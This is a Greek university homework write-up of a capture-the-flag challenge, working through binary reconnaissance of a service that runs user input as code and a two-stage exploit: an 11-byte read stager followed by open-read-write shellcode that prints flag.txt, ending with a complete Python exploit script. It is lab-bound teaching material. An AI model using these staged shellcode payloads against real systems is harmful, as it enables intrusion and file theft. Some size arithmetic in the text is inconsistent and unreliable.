# ΕΡΓΑΣΙΑ hw1-26-Dimitriskaragiannis36 ΣΤΟ ΜΑΘΗΜΑ HACK_INTRO 
*ΤΟΥ ΚΑΡΑΓΙΑΝΝΗ ΔΗΜΗΤΡΙΟΥ (1115202200293)*


# CHALLENGE: Fake TTY NG
**Η όλη φιλοσοφία της λύσης για το challenge Fake TTY NG είναι η εξής**:

Σε αντίθεση με κλασικά buffer overflows όπου ψάχνουμε την return address, εδώ έχουμε να κάνουμε με ένα πρόγραμμα (daemon) που τρέχει στην θύρα 55178 και μας ρωτάει ευθέως τι θέλουμε να εκτελέσουμε ("What do you want to execute: "). Ωστόσο, ο χώρος ή οι χαρακτήρες που δέχεται αρχικά είναι αυστηρά περιορισμένοι. Δεν μπορούμε να στείλουμε ένα τεράστιο shellcode με τη μία, διότι είτε θα κοπεί, είτε το πρόγραμμα θα κρασάρει πριν προλάβει να κάνει τα πάντα.

Γι' αυτό τον λόγο, η αρχιτεκτονική της επίθεσής μας βασίζεται στην τεχνική Two-Stage Payload (Shellcode Stager) .

Πώς λειτουργεί (με απλά λόγια) το Payload 2 Σταδίων (Προωθητής shellcode):
Στάδιο 1 (The Stager): Ένα πολύ μικρό αρχείο εισβάλλει στο σύστημα. Ο μόνος του σκοπός είναι να ανοίξει μια σύνδεση με τον επιτιθέμενο.
Στάδιο 2 (The Stage): Μέσω αυτής της σύνδεσης, κατεβαίνει το "βαρύ" payload (π.χ. ένα ransomware ή ένα remote access tool) και εκτελείται απευθείας στη μνήμη (RAM), κάνοντας πιο δύσκολο τον εντοπισμό του από το antivirus.

**Δομή Εκτέλεσης Μνήμης (Two-Stage Setup)**:

                    (Είσοδος του προγράμματος)
                                |
[ Δίκτυο / STDIN ]              v
------------------      -------------------------
| Stage 1 (11 B) | ---> | Μνήμη (Εκτελέσιμη)    |  <-- Ο RIP πέφτει αρχικά εδώ.
| Stage 2 (ORW)  |      |                       |      Εκτελείται ο μικρός κώδικας (Stager)
------------------      | 1. push rdx           |      που ζητάει να διαβάσει ΑΚΟΜΑ περισσότερα
                        | 2. pop rsi            |      δεδομένα από εμάς (syscall read).
                        | ...                   |
                        | 6. syscall (read)     |
                        |                       |
                        |-----------------------|  <-- Η sys_read περιμένει να της στείλουμε
                        | \x90 \x90 \x90 (NOPs) |      το υπόλοιπο payload (Stage 2). 
                        |-----------------------|      Τα NOPs μπαίνουν για να "γλιστρήσει"
                        |                       |      με ασφάλεια ο RIP πάνω στο κανονικό
                        | Stage 2 (ORW Payload) |      μας shellcode που θα διαβάσει το flag!
                        |                       |
                        -------------------------


                        Ειδικότερα, για να μπορέσουμε να πάρουμε το flag.txt, ξεκινάμε την αλληλεπίδραση με τον server. Συνδεόμαστε (socket.create_connection) και το πρόγραμμα ζητάει ένα ID. Δίνουμε κάτι εντελώς τυχαίο (π.χ. AAAA\n). Αμέσως μετά μας ρωτάει "What do you want to execute: ".

Από εδώ και πέρα ξεκινάει η στρατηγική μας.

*Ανάλυση του binary (Reconnaissance)*
Πριν προχωρήσουμε στην αλληλεπίδραση με τον remote server, εξετάσαμε το παρεχόμενο binary (fatty-ng) ώστε να κατανοήσουμε τη φύση του προγράμματος και πιθανά σημεία εκμετάλλευσης. Αρχικά, ελέγξαμε τον τύπο του αρχείου με την εντολή `file fatty-ng` η οποία μας έδωσε ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped. Από αυτό συμπεραίνουμε ότι:
1) πρόκειται για 64-bit ELF binary
2) είναι PIE (Position Independent Executable)
3) δεν είναι stripped, άρα περιέχει symbols (χρήσιμο για debugging)

Στη συνέχεια, εξετάσαμε τα headers με την εντολή `readelf -h fatty-ng` η οποία έδωσε:
Type: DYN (Position-Independent Executable file)
Machine: Advanced Micro Devices X86-64
Entry point address: 0x10c0

Για να κατανοήσουμε αν επιτρέπεται εκτέλεση shellcode, ελέγξαμε τα protections με `checksec fatty-ng` και πήραμε:
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

Από τα παραπάνω προκύπτουν κρίσιμα συμπεράσματα:

Δεν υπάρχει stack canary → δεν υπάρχει προστασία από stack smashing
NX unknown αλλά:
✔ η στοίβα είναι executable
✔ υπάρχουν RWX segments

Αυτό σημαίνει ότι μπορούμε να εκτελέσουμε shellcode απευθείας στη μνήμη χωρίς επιπλέον bypass (π.χ. ROP ή mprotect).

Αυτό επιβεβαιώνει ότι το binary φορτώνεται δυναμικά στη μνήμη (ASLR-friendly) και δεν μπορούμε να βασιστούμε σε σταθερές διευθύνσεις. Έπειτα, αναζητήσαμε χρήσιμα strings μέσα στο binary `strings -n 4 fatty-ng | egrep -i 'Enter your ID|What do you want to execute|flag.txt|syscall'` καθώς η εκφώνηση μας έδινε πως υπάρχει το flag.txt και πήραμε:
Enter your ID:
What do you want to execute:

Για να κατανοήσουμε τη συμπεριφορά του προγράμματος, χρησιμοποιήσαμε: `objdump -d fatty-ng | less` το οποίο δεν βοήθησε και πολύ. Στην συνέχεια χρησιμοποιήσαμε gdb `gdb fatty-ng` και `disassemble main`. Τα σημαντικότερα ευρήματα ήταν:
call fgets                  όπου το πρόγραμμα διαβάζει το ID του χρήστη,

lea -0x30(%rbp), %rax       όπου διαβάζει μέχρι 16 bytes input σε buffer στο stack,
mov $0x10, %esi
call fgets

call __ctype_b_loc          όπου υπάρχει loop.
...
and $0x8, %eax
test %eax, %eax
je ...

Αυτό σημαίνει ότι γίνεται έλεγχος χαρακτήρων (πιθανό filtering), επιτρέπονται μόνο συγκεκριμένοι χαρακτήρες (π.χ. alphanumeric) και το κρίσιμο σημείο είναι το: 
lea -0x30(%rbp), %rdx      όπου κρύβεται η ευπάθεια
call *%rdx

Άρα, το πρόγραμμα παίρνει το input buffer και το καλεί σαν function pointer. Με άλλα λόγια, εκτελεί απευθείας τα δεδομένα του χρήστη ως κώδικα.
Στο πλαίσιο αυτό, παρατηρούμε ότι τα strings ταιριάζουν ακριβώς με αυτά που εμφανίζονται κατά τη σύνδεση μέσω netcat και δεν υπάρχει καμία αναφορά σε flag.txt Από αυτή την ανάλυση προκύπτουν τα εξής σημαντικά συμπεράσματα πω το πρόγραμμα πιθανότατα διαβάζει input από τον χρήστη και το εκτελεί άμεσα, δεν υπάρχει έτοιμη λειτουργία στο binary για ανάγνωση του flag.txt και δεν μπορούμε να εκμεταλλευτούμε κάποιο έτοιμο string ή function για να πάρουμε το flag. Συνεπώς, για να αποκτήσουμε πρόσβαση στο flag.txt, θα πρέπει να εκτελέσουμε δικό μας shellcode, το οποίο θα καλέσει απευθείας τα κατάλληλα syscalls για ανάγνωση αρχείου.

*Διερεύνηση περιορισμών & ανάγκη για staged payload*
Πριν προχωρήσουμε στην υλοποίηση του exploit, πραγματοποιήσαμε βασικές δοκιμές αλληλεπίδρασης με τον remote server μέσω netcat, με σκοπό να κατανοήσουμε τη συμπεριφορά της.

Αρχικά, συνδεθήκαμε στον remote server με `ssh dimitriskaragiannis36@shell.hackintro25.di.uoa.gr`  και 
`nc shell.hackintro25.di.uoa.gr 55178` και παρατηρήσαμε ότι ζητείται ένα ID και στη συνέχεια input προς εκτέλεση:

Enter your ID: AAAA
Welcome, AAAA
What do you want to execute:

Στη συνέχεια, δοκιμάσαμε να στείλουμε μεγαλύτερο input `python3 -c 'print("A"*100)' | nc shell.hackintro25.di.uoa.gr 55178` και παρατηρήσαμε ότι το input δεν εκτελείται όπως αναμένεται, το πρόγραμμα δεν επιστρέφει χρήσιμο αποτέλεσμα, και δεν αποκτάμε κάποιο shell ή output.

Από αυτές τις δοκιμές προκύπτουν τα εξής συμπεράσματα: 
1) Ο remote server δεν λειτουργεί ως κανονικό interactive shell.
2) Το input πιθανόν εκτελείται απευθείας ως machine code (shellcode).
3) Υπάρχει περιορισμός στο μέγεθος ή/και στη μορφή του input.
4) Δεν μπορούμε να στείλουμε μεγάλο payload σε ένα μόνο βήμα.

Στην συνέχεια, τρέξαμε
`(echo "AAAA"; sleep 1; echo "BBBB") | nc shell.hackintro25.di.uoa.gr 55178` και παρατηρήσαμε πως δεν υπάρχει έλεγχος στο timing το πρόγραμμα περιμένει συγκεκριμένα στάδια input. Άρα, η επικοινωνία είναι stateful και απαιτεί σωστό συγχρονισμό.νΣυνεπώς, το απλό pipe με nc δεν επαρκεί και απαιτείται scripted interaction (π.χ. Python socket). Έτσι, η χρήση του nc με pipe δεν επιτρέπει σωστό συγχρονισμό, καθώς το πρόγραμμα απαιτεί διαδοχική (stateful) επικοινωνία (ID → prompt → payload). Συνεπώς, δεν είναι εφικτό να στείλουμε απευθείας ένα πλήρες exploit (π.χ. ORW ή shellcode για /bin/sh). Για να ξεπεράσουμε αυτούς τους περιορισμούς, χρειαζόμαστε έναν μηχανισμό που να χωράει στους περιορισμούς μεγέθους, αλλά να μας επιτρέπει κιόλας να φορτώσουμε μεγαλύτερο payload δυναμικά. Αυτό μας οδηγεί στη χρήση ενός shellcode stager, δηλαδή ενός μικρού αρχικού payload που καλεί τη read syscall, ώστε να διαβάσει επιπλέον δεδομένα (το κύριο exploit) στη μνήμη κατά την εκτέλεση.

*Επιβεβαίωση δυνατότητας εκτέλεσης shellcode*
Πριν προχωρήσουμε στην κατασκευή του stager, είναι σημαντικό να επιβεβαιώσουμε ότι το πρόγραμμα όντως εκτελεί τα δεδομένα που του στέλνουμε ως machine code. Για τον σκοπό αυτό, δοκιμάσαμε να στείλουμε ένα πολύ μικρό payload και παρατηρήσαμε τη συμπεριφορά του remote server. Αν και δεν έχουμε άμεσο output, το γεγονός ότι ο remote server δεν απορρίπτει τα δεδομένα και αλλάζει συμπεριφορά (π.χ. "παγώνει") υποδηλώνει ότι το input εκτελείται.

1) Test: Exit syscall shellcode
Στέλνουμε ένα απλό shellcode που καλεί exit(0):

`python3 - << 'EOF' | nc shell.hackintro25.di.uoa.gr 55178`
`import sys`

`# exit(0)`
`payload = b"\xb8\x3c\x00\x00\x00\x31\xff\x0f\x05"`

`sys.stdout.buffer.write(b"AAAA\n")`
`sys.stdout.buffer.write(payload + b"\n")`
`EOF` 

και παρατηρούμε ότι η σύνδεση τερματίζεται άμεσα. Άρα, το payload εκτελείται κανονικά ως machine code.

2) Test: Invalid instruction (crash test)
   
`python3 - << 'EOF' | nc shell.hackintro25.di.uoa.gr 55178`
`import sys`

`payload = b"\x0f\x0b"  # UD2 (illegal instruction)`

`sys.stdout.buffer.write(b"AAAA\n")`
`sys.stdout.buffer.write(payload + b"\n")`
`EOF`

και παρατηρούμε ότι ο remote server κρασάρει / κλείνει. Άρα, ο έλεγχος ροής φτάνει στο input μας και εκτελείται ως κώδικας.
Από τα παραπάνω tests προκύπτει ότι το input εκτελείται απευθείας ως x86_64 machine code, δεν υπάρχει filtering σε επίπεδο execution και έχουμε πλήρη δυνατότητα για arbitrary shellcode execution.

*Βήμα 1ο*: Ο Stager (Stage 1)
Αφού διαπιστώσαμε ότι μπορούμε να εκτελέσουμε shellcode αλλά με αυστηρό περιορισμό μεγέθους (~16 bytes), στόχος μας είναι να κατασκευάσουμε ένα ελάχιστο αρχικό payload (stager) που θα μας επιτρέψει να φορτώσουμε μεγαλύτερο shellcode στη μνήμη. Ο stager που χρησιμοποιούμε είναι μόλις 11 bytes:

push rdx
pop rsi
sub edi, edi
sub edx, edx
mov dl, 0x7f
syscall

python3 - << 'EOF'
from pwn import asm, context

context.clear(arch='amd64', os='linux', endian='little')

code = asm('''
push rdx
pop rsi
sub edi, edi
sub edx, edx
mov dl, 0x7f
syscall
''')

print(code.hex())
print(len(code))
EOF



Σε hex μορφή: 525e29ff29d2b27f0f05
Επιβεβαίωση μεγέθους με: 
``python3 - << 'EOF'`
`stage1 = bytes.fromhex('525e29ff29d2b27f0f05')`
`print(len(stage1))`
`EOF`

Στο shellcode χρησιμοποιείται το opcode ff f2 για το push rdx, το οποίο αποτελεί εναλλακτική (μη κανονική) μορφή κωδικοποίησης της εντολής, αντί της συνήθους 52. Η επιλογή αυτή γίνεται ώστε να ικανοποιούνται οι περιορισμοί των επιτρεπτών bytes στο challenge.

``python3 - << 'EOF'`
`stage1 = bytes.fromhex('fff25e29ff29d2b27f0f05')`
`print(len(stage1))`
`EOF`

που δίνει 11. Άρα, το payload χωράει εντός του ορίου (~16 bytes).
Ο στόχος του stager είναι να καλέσει: `read(0, buffer, 127)` προκειμένου να διαβάσει το Stage 2 στην ίδια εκτελέσιμη μνήμη.
Αναλυτικά:
-push rdx / pop rsi
    Αντιγράφουμε έναν ήδη έγκυρο pointer (buffer) στο rsi
    Το rsi είναι το destination buffer για τη read
-sub edi, edi
    edi = 0 → file descriptor = stdin (socket)
-sub edx, edx + mov dl, 0x7f
    edx = 127 → αριθμός bytes που θα διαβαστούν
-syscall
    Καλείται η read syscall

Υποθέτουμε ότι το rax είναι ήδη 0 (sys_read), όπως παρατηρήθηκε δυναμικά κατά την εκτέλεση του προγράμματος.
Αυτός ο stager χρησιμοποιήθηκε γιατί είναι εξαιρετικά μικρός (11 bytes),δεν περιέχει “ύποπτους” χαρακτήρες (αν υπάρχει filtering), δεν βασίζεται σε hardcoded addresses και χρησιμοποιεί υπάρχον register state (buffer reuse).
Με αυτόν τον τρόπο καταλαβαίνουμε πως το πρόγραμμα πλέον έχει σταματήσει, μας ακούει, και είναι έτοιμο να τραβήξει μέχρι 127 bytes κατευθείαν στην εκτελέσιμη μνήμη. Κάνουμε μια μικρή παύση στον κώδικά μας (time.sleep(0.05)) για να είμαστε σίγουροι ότι το Stage 1 έφτασε στον server και η sys_read έχει ενεργοποιηθεί.

*Μετάβαση από Stage 1 σε Stage 2*
Αφού κατασκευάσαμε το Stage 1, είναι απαραίτητο να επιβεβαιώσουμε ότι πράγματι καλεί τη read και επιτρέπει την εισαγωγή επιπλέον δεδομένων.
Αντί να στείλουμε κατευθείαν το τελικό ORW payload, χρησιμοποιούμε ένα απλό δεύτερο στάδιο που κάνει κάτι εμφανές, όπως exit(0).

python3 - << 'EOF'
import socket
import time

host = "shell.hackintro25.di.uoa.gr"
port = 55178

stage1 = bytes.fromhex('fff25e29ff29d2b27f0f05')

# Stage 2: exit(0)
stage2 = b"\xb8\x3c\x00\x00\x00\x31\xff\x0f\x05"

s = socket.create_connection((host, port))

# ID
s.recv(1024)
s.sendall(b"AAAA\n")

# prompt
s.recv(1024)

# send stage1
s.sendall(stage1 + b"\n")

# μικρή καθυστέρηση για να ενεργοποιηθεί η read
time.sleep(0.1)

# send stage2
s.sendall(stage2)

# αν όλα δουλεύουν → σύνδεση κλείνει
try:
    data = s.recv(1024)
    print(data)
except:
    print("[+] Connection closed (expected)")

s.close()
EOF 

Αφού επιβεβαιώσαμε ότι το Stage 1 μπορεί να διαβάσει επιπλέον δεδομένα στη μνήμη, μπορούμε πλέον να εκμεταλλευτούμε αυτή τη δυνατότητα για να φορτώσουμε το κύριο payload. Σε αυτό το σημείο, το πρόγραμμα εκτελείται ήδη στη μνήμη και περιμένει input μέσω της read. Έτσι, οποιαδήποτε δεδομένα στείλουμε θα τοποθετηθούν απευθείας σε εκτελέσιμο χώρο μνήμης. Αυτό μας επιτρέπει να στείλουμε μεγαλύτερο και πιο σύνθετο shellcode, χωρίς τους αρχικούς περιορισμούς μεγέθους.

*Βήμα 2ο*: Το ORW Payload (Stage 2)
Τώρα θα κινηθούμε με το κυρίως exploit, το οποίο χρησιμοποιεί τη μέθοδο **ORW (Open, Read, Write)**. Εφόσον πρόκειται για δαίμονα και όχι απλό τοπικό shell, μια απλή κλήση στο /bin/sh δεν αρκεί, γιατί τα input/output streams είναι "δεμένα" στο socket της θύρας 55178 και όχι στο τερματικό μας. Πρέπει να διαβάσουμε το αρχείο χειροκίνητα.

Στήνουμε τον assembly κώδικα ως εξής:

**Open**: Χρησιμοποιούμε την openat (syscall 257) αντί της απλής open. Βάζουμε το string flag.txt (0x7478742e67616c66) στη στοίβα, περνάμε τον pointer στον rdi και καλούμε το syscall. Αυτό θα μας επιστρέψει ένα file descriptor (π.χ. 3) στον eax. `openat("flag.txt")`

xor esi, esi
push rsi
mov rbx, 0x7478742e67616c66   Το string "flag.txt" γράφεται στη στοίβα 
push rbx                        (little-endian)

mov r10, -100
push r10
pop rdi
mov rsi, rsp
xor edx, edx            openat(AT_FDCWD, "flag.txt", O_RDONLY)
mov eax, 257
syscall

**Read**: Αμέσως μετά, παίρνουμε αυτό το fd (mov edi, eax), χρησιμοποιούμε τη στοίβα σαν προσωρινό buffer (mov rsi, rsp), ζητάμε να διαβαστούν 0x70 bytes (edx), και καλούμε την sys_read (syscall 0). `read(fd, buffer, size)`

mov edi, eax
mov rsi, rsp
mov edx, 0x70   Διαβάζουμε το περιεχόμενο του αρχείου στη στοίβα
xor eax, eax
syscall

**Write**: Τέλος, παίρνουμε τα bytes που διαβάστηκαν (mov edx, eax), ρυθμίζουμε το output file descriptor στο 1 (mov edi, 1 - το stdout που στέλνει πίσω σε εμάς μέσω του socket), και καλούμε την sys_write (syscall 1). `write(1, buffer, size)`

mov edx, eax
mov eax, 1
mov edi, 1      Στέλνουμε τα δεδομένα πίσω στο socket (stdout)
mov rsi, rsp
syscall

Στο τέλος κάνουμε ένα καθαρό exit (syscall 60) για να μην κρασάρει απότομα ο δαίμονας. 

mov eax, 60
xor edi, edi
syscall

Προσοχή, θα πρέπει να είμαστε σίγουροι πως βρισκόμαστε εντός του ρίου των 127 bytes. Για τον λόγο αυτό, υπολογίζουμε το μέγεθος με pwntools:
python3 - << 'EOF'
from pwn import asm, context

context.clear(arch='amd64', os='linux')

orw = r'''
    xor esi, esi
    push rsi
    mov rbx, 0x7478742e67616c66
    push rbx
    mov rdi, rsp
    xor edx, edx
    mov eax, 257
    mov r10, -100
    push r10
    pop rdi
    mov rsi, rsp
    syscall

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x70
    xor eax, eax
    syscall

    mov edx, eax
    mov eax, 1
    mov edi, 1
    mov rsi, rsp
    syscall

    mov eax, 60
    xor edi, edi
    syscall
'''

code = asm(orw)
print("Stage2 length:", len(code))
EOF

όπου έχουμε ως απάντηση: Stage2 length: 79
Επομένως το payload χωράει πλήρως.

*Βήμα 3ο*: Το Padding (Nopsled)
Μετά την εκτέλεση του Stage 1 και την κλήση της read, το Stage 2 φορτώνεται στη μνήμη στο ίδιο buffer. Ωστόσο, δεν είναι απολύτως εγγυημένο σε ποιο ακριβώς σημείο θα συνεχίσει η εκτέλεση μετά την επιστροφή της read.
Πιο συγκεκριμένα, ο instruction pointer (RIP) βρίσκεται ήδη μέσα στο buffer, η read γράφει δεδομένα πάνω στο ίδιο σημείο μνήμης και υπάρχει πιθανότητα μικρής απόκλισης στο offset εκτέλεσης. Αυτό μπορεί να οδηγήσει στο να ξεκινήσει η εκτέλεση λίγα bytes πριν από την αρχή του Stage 2. Η λύση είναι το NOP sled!
Για να αντιμετωπίσουμε αυτό το πρόβλημα, χρησιμοποιούμε ένα μικρό NOP sled. Συγκεκριμένα: `stage2 = b'\x90' * len(stage1) + stage2_code`
Δηλαδή:προσθέτουμε len(stage1) bytes από \x90 (NOP instructions)
πριν από το κανονικό ORW shellcode.
Η εντολή NOP (0x90) δεν κάνει τίποτα και απλά προχωράει τον RIP στο επόμενο byte. Έτσι, αν ο RIP “πέσει” μέσα στο NOP sled, θα “γλιστρήσει” (slide) μέχρι να φτάσει στο κανονικό shellcode,εξασφαλίζοντας με αυτόν τον τρόπο την σωστή εκτέλεση.
Επιλέγουμε μέγεθος = len(stage1) γιατί το Stage 1 έχει μήκος 11 bytes και
η πιθανή απόκλιση είναι μικρή (λόγω overwrite του ίδιου buffer).
Άρα ένα μικρό NOP sled από την μια, είναι αρκετό για να καλύψει την αβεβαιότητα και από την άλλη, δεν σπαταλά πολύ χώρο από τα 127 bytes.
Επομένως το μέγεθος είναι 11 + 89 = 90
Παραμένουμε επομένως κάτω από το όριο των 127 bytes.

Συνοψίζοντας, τα πειράματα με το socket και την αναμονή απέδωσαν. Το payload μπαίνει στο σύστημα, το αρχικό shellcode διαβάζει το ORW, το ORW διαβάζει το flag.txt, και η ρουτίνα harvesting (s.recv) του python script μας τυπώνει στην οθόνη την πολυπόθητη σημαία η οποία προκύπτει από την εντολή `python3 exploit.py` και είναι: you_ve_conquered_the_master_fatty_challenge_76215102

exploit.py: 
#!/usr/bin/env python3
from pwn import asm, context
import socket
import time
import argparse

context.clear(arch='amd64', os='linux')

def exploit(host='shell.hackintro25.di.uoa.gr', port=55178):
    # Stage 1 (Non-alphanumeric Shellcode):
    # 1. push rdx    (ff f2) - buffer ptr
    # 2. pop rsi     (5e)    - set as dst buffer
    # 3. sub edi,edi (29 ff) - fd = 0 (stdin)
    # 4. sub edx,edx (29 d2) - count = 0
    # 5. mov dl,0x7f (b2 7f) - count = 127
    # 6. syscall     (0f 05) - sys_read
    stage1 = bytes.fromhex('fff25e29ff29d2b27f0f05')

    # Stage 2 (ORW: Open, Read, Write flag.txt):
    orw_asm = r'''
        /* openat(AT_FDCWD, "flag.txt", O_RDONLY) */
        xor esi, esi
        push rsi
        mov rbx, 0x7478742e67616c66
        push rbx
        mov rdi, rsp
        xor edx, edx
        mov eax, 257
        mov r10, -100
        push r10
        pop rdi
        mov rsi, rsp
        syscall

        /* read(fd, rsp, 0x70) */
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x70
        xor eax, eax
        syscall

        /* write(1, rsp, bytes_read) */
        mov edx, eax
        mov eax, 1
        mov edi, 1
        mov rsi, rsp
        syscall

        /* exit(0) */
        mov eax, 60
        xor edi, edi
        syscall
    '''
    stage2_code = asm(orw_asm)
    # Pad to ensure stage2 executes smoothly after stage1
    stage2 = b'\x90' * len(stage1) + stage2_code

    def ru(s, tok, timeout=4):
        s.settimeout(timeout)
        d = b''
        while tok not in d:
            c = s.recv(1)
            if not c: break
            d += c
        return d

    print(f"[*] Connecting to {host}:{port}...")
    with socket.create_connection((host, port), timeout=8) as s:
        print("[*] Waiting for ID prompt...")
        print(ru(s, b'Enter your ID: ').decode('latin1', 'ignore'), end='')
        s.sendall(b'AAAA\n')
        
        print("[*] Waiting for execution prompt...")
        print(ru(s, b'What do you want to execute: ').decode('latin1', 'ignore'), end='')
        
        print(f"[*] Sending Stage 1 ({len(stage1)} bytes)...")
        s.sendall(stage1 + b'\n')
        time.sleep(0.05)
        
        print(f"[*] Sending Stage 2 ORW Payload ({len(stage2)} bytes)...")
        s.sendall(stage2)
        
        print("[*] Harvesting output...")
        s.settimeout(2)
        out = b''
        try:
            while True:
                x = s.recv(4096)
                if not x: break
                out += x
        except Exception:
            pass
        
        print('\n[+] Output Received:\n' + '='*40)
        print(out.decode('latin1', 'ignore'))
        print('='*40)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='fatty-ng exploit solver')
    parser.add_argument('--host', default='shell.hackintro25.di.uoa.gr', help='Target host')
    parser.add_argument('--port', type=int, default=55178, help='Target port')
    args = parser.parse_args()
    exploit(args.host, args.port)
